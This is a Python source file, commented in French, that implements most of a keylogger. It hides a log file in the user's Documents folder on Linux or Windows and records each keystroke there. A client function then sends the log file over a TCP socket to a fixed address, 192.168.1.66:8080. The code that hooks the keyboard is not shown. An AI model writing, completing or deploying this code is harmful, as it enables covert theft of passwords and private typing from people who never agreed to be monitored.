import platform, os, ctypes, socket

# Fonction création simple du fichier
def creation_fichier(nom_fichier, sys):
    if sys == "Linux":
        # Créer un fichier cacher dans le dossier Document de l'utilisateur
        try:
            path = "/home/%s/Documents/.%s" %(os.getlogin(), nom_fichier)
            open(path, "w")
            return path
        except Exception as e:
            print(f"Erreur lors de la création de %s : {e}" %(nom_fichier))
    elif sys == "Windows":
        # Créer un fichier cacher dans le dossier Document de l'utilisateur
        try:
            path = "C:\\Users\\%s\\Documents\\%s" %(os.getlogin(), nom_fichier)
            open(path, "w")
            ctypes.windll.kernel32.SetFileAttributesW(path, 2)
            return path
        except Exception as e:
            print(f"Erreur lors de la création de %s : {e}" %(nom_fichier))
    else:
        pass

# Fonction pour écrire les frappes dans le fichier
def touche_fichier(file_path, event):
    try:
        # Récupère la touche pressée
        key = event.name

        # Ouvre le fichier en mode ajout
        with open(file_path, "a", encoding="utf-8") as f:
            if key == "space":
                f.write(" ")
            elif key == "enter":
                f.write("\n")
            elif key == "backspace":
                # Aller à la fin du fichier et reculer d'un caractère
                f.seek(0, 2)
                f.seek(f.tell() - 1, 0)
                # Tronquer le fichier d'un caractère
                f.truncate()
            elif key == "maj" or key == "caps lock" or key == "shift" or key == "alt gr" or key == "tab" or key == "esc":
                pass
            else:
                f.write(key)

    except AttributeError:
        # Ignore les touches non valides (comme les touches de fonction)
        pass

# Fonction de détection d'OS
def detect_os():
    if "Linux" in platform.uname():
        return "Linux"
    elif "Windows" in platform.uname():
        return "Windows"
    else :
        return "Other"
    
# Fonction de client
def client(file_path):
    # Paramètres du serveur
    server_address = ("192.168.1.66", 8080)

    # Création du socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Etablisser une connexion avec le serveur
    client_socket.connect(server_address)

    # Ouvrir le fichier en mode lecture binaire
    with open(file_path, "rb") as f:
        # Lire les données du fichier
        data = f.read(1024)
        while data:
            # Envoyer les données au serveur
            client_socket.send(data)
            # Lire les données du fichier
            data = f.read(1024)

    # Fermer la connexion
    client_socket.close()